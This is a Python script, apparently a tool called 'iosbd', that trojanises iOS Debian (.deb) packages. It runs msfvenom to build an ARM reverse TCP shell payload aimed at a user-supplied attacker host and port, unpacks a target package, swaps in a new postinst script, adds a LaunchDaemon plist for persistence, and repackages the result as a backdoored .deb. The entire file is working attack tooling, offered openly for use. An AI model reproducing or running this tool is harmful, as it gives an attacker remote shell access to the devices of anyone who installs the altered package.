#!/usr/bin/env python
"""
Dependancies:
	Metasploit: https://github.com/rapid7/metasploit-framework
	Dpkg:
		sudo apt-get install dpkg
		https://aur.archlinux.org/packages/dpkg/
		If you're using RHEL or CentOS figure something out lmao
"""
import os, subprocess, argparse, sys

inspiration = """
    ____            ____                                             
 _,',--.`-.      _,',--.`-.                                          
<_ ( () )  >  ( <_ ( () )  >    ATTENTION EVERYONE                   
  `-:__;,-'    \  `A:__:,-'                                          
                \ / \           SORRY IF I'M A LITTLE TEARY RIGHT NOW
                 ((  )                                               
                  \-'           BUT IOSBD IS JIGGY                   
         -Shimrod  \                                 AS FUCK         
                    \                                                
         (           )                                               
          `-'"`-----'                                                """

dirs1 = ['tmp', 'var', 'mobile', 'Library', 'payme']
dirs2 = ['tmp', 'Library', 'LaunchDaemons', 'com.cron.weekly.plist']
dirs3 = ['tmp', 'DEBIAN', 'postinst']
dirs = [dirs1, dirs2, dirs3]

blue = '\033[94m'
red = '\033[91m'
end = '\033[0m'

def create_backdoor(package, lhost, lport, output):
	print('[+] Generating armle payload...')
	try:
		subprocess.check_call('msfvenom -p osx/armle/shell_reverse_tcp LHOST=%s LPORT=%s -o src/var/mobile/Library/payme -f macho -a armle --platform osx &>/dev/null' % (lhost, lport), shell=True)
	except:
		print('%sPayload generation failed: Check MSF%s' % (red, end))
		sys.exit()
	print('[+] Inserting backdoor...')
	try:
		subprocess.check_call('dpkg-deb -R %s tmp' % package, shell=True)
		if os.path.exists('tmp/DEBIAN/postinst') == True:
			subprocess.check_call('mv tmp/DEBIAN/postinst tmp/DEBIAN/postinst2', shell=True)
		done = ''
		i = 0
		for array in dirs:
			for dir in array:
				i += 1
				if i < len(array):
					done += dir + '/'
					if os.path.exists(done) == False:
						os.mkdir(done, 0755)
				else:
					done += dir
					i = 0
			done2 = done.replace('tmp', 'src')
			subprocess.check_call('cp %s %s' % (done2, done), shell=True)
			done = ''
	except:
		print('%sFailed to insert backdoor%s' % (red, end))
		sys.exit()
	print('[+] Building new package...')
	try:
		subprocess.check_call('dpkg-deb -b tmp %s &>/dev/null; rm -r tmp' % output, shell=True)
	except:
		print('%sFailed to rebuild package%s' % (red, end))
		sys.exit()
	print('%sBackdoored package successfully created!%s' % (blue, end))

def main():
	print('%s\n' % inspiration[1:])
	parser = argparse.ArgumentParser()
	parser.add_argument('-p', '--package', dest='package', help='Package to backdoor', metavar='package')
	parser.add_argument('-lh', '--lhost', dest='lhost', help='Host for reverse shell', metavar='LHOST')
	parser.add_argument('-lp', '--lport', dest='lport', help='Port for reverse shell', metavar='LPORT')
	parser.add_argument('-o', '--output', dest='output', help='Path to save backdoored package', metavar='output', default='backdoor.deb')
	args = parser.parse_args()
	try:
		package = args.package
		lhost = args.lhost
		lport = args.lport
		output = args.output
		if package is None or lhost is None or lport is None:
			raise exception()
	except:
		parser.print_help()
		sys.exit()

	create_backdoor(package, lhost, lport, output)

if __name__ == "__main__":
    main()
